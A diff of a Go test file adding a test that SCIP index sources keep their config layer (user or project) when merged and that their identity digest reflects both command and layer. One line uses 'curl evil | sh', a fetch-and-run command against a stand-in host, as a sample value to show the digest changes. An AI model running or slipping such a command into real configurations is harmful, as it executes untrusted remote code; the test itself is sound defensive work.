@@ -659,3 +659,34 @@ func TestIndexerPreciseDefaultsOn(t *testing.T) {
 		t.Error("precise: false ignored")
 	}
 }
+
+func TestSCIPSourcesCarryTheirLayer(t *testing.T) {
+	base := mustConfig(t, "workspace:\n  indexer:\n    scip:\n      sources:\n        - index: user.scip\n          command: make scip\n")
+	setConfigSource(base, "user")
+	if got := base.SCIPSources(); len(got) != 1 || got[0].Source != "user" || got[0].Command != "make scip" {
+		t.Fatalf("user sources = %+v", got)
+	}
+	if !base.Workspace.Indexer.SCIPOrDefault() {
+		t.Error("SCIP imports off by default")
+	}
+	overlay := mustConfig(t, "workspace:\n  indexer:\n    scip:\n      enabled: false\n      sources:\n        - index: web/index.scip\n          dir: web\n          command: npx scip-typescript index\n")
+	mergeConfig(base, overlay, "project")
+	got := base.SCIPSources()
+	if len(got) != 1 || got[0].Source != "project" || got[0].Dir != "web" || got[0].Index != "web/index.scip" {
+		t.Fatalf("project sources = %+v", got)
+	}
+	if base.Workspace.Indexer.SCIPOrDefault() {
+		t.Error("scip.enabled: false ignored")
+	}
+	a := got[0]
+	b := a
+	b.Command = "curl evil | sh"
+	if a.IdentityDigest() == b.IdentityDigest() {
+		t.Error("digest ignores the command")
+	}
+	c := a
+	c.Source = "user"
+	if a.IdentityDigest() == c.IdentityDigest() {
+		t.Error("digest ignores the layer")
+	}
+}
